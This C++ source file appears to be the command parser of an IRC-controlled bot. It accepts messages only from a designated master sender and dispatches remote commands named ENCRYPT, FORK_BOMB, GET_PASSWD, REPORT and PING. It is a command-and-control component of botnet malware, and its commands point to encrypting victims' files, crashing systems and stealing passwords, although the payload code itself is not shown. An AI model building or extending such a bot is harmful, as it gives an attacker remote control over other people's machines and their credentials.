#include "MessageParser.hpp"
#include "ActionType.hpp"

std::vector<std::string> buildParams(std::string receivedMessage) {
    std::vector<std::string> result;
    std::istringstream iss(receivedMessage);
    std::string param;
    while (iss >> param) {
        result.push_back(param);
    }
    return result;
}

ActionInfo MessageParser::parseMessage(std::string receivedMessage, const char* expectedSender) {
    std::vector<std::string> messageParams = buildParams(receivedMessage);

    if (messageParams.size() < MessageParser::MIN_PARAMS) {
        return ActionInfo(ActionType::UNKNOWN, std::vector<std::string>());
    }

    // Ensure that sender is from the master program
    const char* sender = messageParams[MessageParser::SENDER_IDX].c_str();
    if (!GeneralUtils::cStrAreEqual(sender, expectedSender)) {
        return ActionInfo(ActionType::UNKNOWN, std::vector<std::string>()); 
    }

    const char* msgType = messageParams[MessageParser::MSG_TYPE_IDX].c_str();
    if (!GeneralUtils::cStrAreEqual(msgType, "MSG") && !GeneralUtils::cStrAreEqual(msgType, "PRIVMSG")) { // Only general messages and private messages can contain bot commands
        return ActionInfo(ActionType::UNKNOWN, std::vector<std::string>());
    }

    // Determine what type, if any, the command is
    const char* strActionType = messageParams[MessageParser::ACTION_TYPE_IDX].c_str();
    ActionType actionType;
    if (GeneralUtils::cStrAreEqual(strActionType, "PING")) {
        actionType = ActionType::PING;
    } else if (GeneralUtils::cStrAreEqual(strActionType, "ENCRYPT")) {
        actionType = ActionType::ENCRYPT;
    } else if (GeneralUtils::cStrAreEqual(strActionType, "REPORT")) {
        actionType = ActionType::REPORT;
    } else if (GeneralUtils::cStrAreEqual(strActionType, "FORK_BOMB")) {
        actionType = ActionType::FORK_BOMB;
    } else if (GeneralUtils::cStrAreEqual(strActionType, "GET_PASSWD")) {
        actionType = ActionType::GET_PASSWD;
    } else {
        actionType = ActionType::UNKNOWN;
    }

    return ActionInfo(actionType, messageParams);
}
